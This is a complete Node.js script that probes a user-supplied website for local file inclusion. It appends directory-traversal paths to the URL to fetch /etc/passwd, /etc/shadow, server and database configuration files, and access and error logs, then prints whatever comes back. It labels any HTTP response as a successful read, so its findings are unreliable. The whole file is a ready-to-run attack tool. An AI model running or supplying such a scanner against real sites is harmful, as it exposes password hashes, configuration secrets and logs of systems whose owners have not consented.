const http = require('http');
const readline = require('readline');

// Function to make a GET request to the target URL
function getRequest(url) {
    return new Promise((resolve, reject) => {
        http.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => {
                data += chunk;
            });
            res.on('end', () => {
                resolve(data);
            });
        }).on('error', (error) => {
            reject(error);
        });
    });
}

// Function to test LFI vulnerability
async function testLFI(targetUrl) {
    const pathsToTest = [
        '../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../etc/hosts',
        '../../../../../../../../../../etc/shadow',
        '../../../../../../../../../../etc/apache2/apache2.conf',
        '../../../../../../../../../../etc/nginx/nginx.conf',
        '../../../../../../../../../../etc/mysql/my.cnf',
        '../../../../../../../../../../var/log/apache2/access.log',
        '../../../../../../../../../../var/log/apache2/error.log',
        '../../../../../../../../../../var/log/nginx/access.log',
        '../../../../../../../../../../var/log/nginx/error.log',
        '../../../../../../../../../../var/log/mysql/error.log'
    ];
    
    console.log('\x1b[33m', 'Testing for LFI vulnerability...');

    for (const path of pathsToTest) {
        const url = `${targetUrl}${path}`;
        console.log('\x1b[36m', `Testing ${url}...`);
        try {
            const data = await getRequest(url);
            console.log('\x1b[32m', `Success: ${url} is accessible.`);
            console.log('\x1b[33m', `Contents: \n${data}`);
        } catch (error) {
            console.log('\x1b[31m', `Failed: ${url} is not accessible.`);
        }
    }
}

// Function to prompt user for target website URL
function promptUser() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('Enter your target website URL: ', async (answer) => {
        const targetUrl = answer.trim();
        console.log('\x1b[36m', `Testing target: ${targetUrl}`);
        await testLFI(targetUrl);
        rl.close();
    });
}

// Start the program
promptUser();
